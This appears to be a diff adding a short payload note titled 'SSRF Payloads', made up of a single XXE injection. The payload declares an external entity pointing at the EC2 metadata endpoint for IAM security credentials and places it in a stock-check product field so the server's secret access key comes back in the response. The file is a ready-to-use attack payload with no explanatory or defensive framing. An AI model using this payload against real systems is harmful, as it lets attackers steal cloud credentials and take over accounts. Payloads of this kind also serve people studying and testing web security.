@@ -1,0 +1,5 @@
+SSRF Payloads:
+
+SSRF with XXE to obtain server's IAM secret access key from the EC2 metadata endpoint
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.xxx.xxx.xxx/latest/meta-data/iam/security-credentials/admin"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
